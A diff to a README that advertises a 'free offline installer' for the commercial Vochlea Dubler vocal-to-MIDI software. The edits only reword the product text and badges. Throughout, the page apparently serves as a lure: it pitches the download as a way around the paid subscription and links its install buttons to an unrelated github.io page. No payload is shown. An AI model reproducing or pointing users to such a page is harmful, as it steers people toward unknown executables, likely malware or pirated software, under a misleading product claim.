@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Vocal-to-MIDI-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Vocal+MIDI+Control-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Vochlea Dubler Free Installer** — Vochlea Dubler is a real-time vocal-to-MIDI controller that turns your voice into a musical instrument. Works without internet access, no account required. Full offline installation.
+**💻 Vochlea Dubler Free Installer** — Vochlea Dubler is a vocal MIDI controller that converts your voice into MIDI signals in real time. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Vochlea Dubler](https://img.shields.io/badge/⬇_Install_Vochlea%20Dubler-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Vochlea Dubler](https://img.shields.io/badge/⬇_Install_Vochlea+Dubler-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Vochlea Dubler
 
-Vochlea Dubler is a real-time vocal-to-MIDI controller that turns your voice into a musical instrument. By humming, beatboxing, or singing into a microphone, you control synthesizers, drum machines, and any MIDI-controllable instrument in your DAW.
+Vochlea Dubler is a vocal MIDI controller that converts your voice into MIDI signals in real time. Hum, whistle, or sing to play synthesizers and samplers, use breath and pitch to control expression, and trigger samples with vocal sounds. Dubler provides an expressive, voice-based musical interface for creating music without traditional instruments or MIDI controllers.
 
 ---
 
 ## ❌ Problem: Vochlea Dubler is hard to access
 
-- **Paid Subscription** — Requires monthly subscription for continued access
-- **Hardware Accessory** — Works best with the dedicated Dubler microphone accessory
-- **Latency** — Real-time voice processing introduces noticeable latency in some DAWs
-- **Learning Curve** — Effective vocal MIDI control requires practice and vocal skill
+- **Commercial License** — Subscription required for continued access
+- **Learning Curve** — Expressive vocal MIDI control requires practice to play accurately
+- **Microphone Quality** — Low-latency conversion requires quality microphone and low-latency audio interface
+- **Musical Niche** — Vocal MIDI control appeals to a specific creative music production style
 
 ---
 
@@ -81,7 +81,7 @@ Vochlea Dubler is a real-time vocal-to-MIDI controller that turns your voice int
 
 <div align="center">
 
-[![⬇ Install Vochlea Dubler](https://img.shields.io/badge/⬇_Install_Vochlea%20Dubler-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Vochlea Dubler](https://img.shields.io/badge/⬇_Install_Vochlea+Dubler-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Vochlea Dubler is a real-time vocal-to-MIDI controller that turns your voice int
 
 ---
 
-**Vochlea Dubler Free Installer** — Vochlea Dubler is a real-time vocal-to-MIDI controller that turns your voice into a musical instrument. Install without internet connection today!
+**Vochlea Dubler Free Installer** — Vochlea Dubler is a vocal MIDI controller that converts your voice into MIDI signals in real time. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Vochlea Dubler](https://img.shields.io/badge/⬇_Install_Vochlea%20Dubler-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Vochlea Dubler](https://img.shields.io/badge/⬇_Install_Vochlea+Dubler-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
